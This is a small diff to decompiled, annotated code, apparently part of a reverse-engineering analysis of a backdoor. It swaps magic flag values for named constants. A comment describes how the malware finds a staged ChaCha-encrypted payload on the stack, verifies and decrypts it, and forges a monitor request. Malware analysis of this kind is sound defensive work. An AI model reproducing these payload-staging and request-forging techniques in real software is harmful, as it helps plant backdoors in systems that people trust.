@@ -202,8 +202,8 @@ LAB_0010845f:
     }
     // AutoDoc: PRIV/EXIT payloads hunt the stack for the staged ChaCha blob, verify its hash, and decrypt it in place before forging the monitor request.
     if ((args->cmd_type == MONITOR_CMD_PROXY_EXCHANGE) &&
-       (monitor_flag_mask = cmd_args->monitor_flags & 0xc0, monitor_flag_mask != 0xc0)) {
-      if (monitor_flag_mask == 0x40) {
+       (monitor_flag_mask = cmd_args->monitor_flags & 0xc0, monitor_flag_mask != MONITOR_PAYLOAD_SOURCE_INLINE)) {
+      if (monitor_flag_mask == MONITOR_PAYLOAD_SOURCE_EXIT) {
         if (libc_funcs->exit == (pfn_exit_t)0x0) {
           return FALSE;
         }
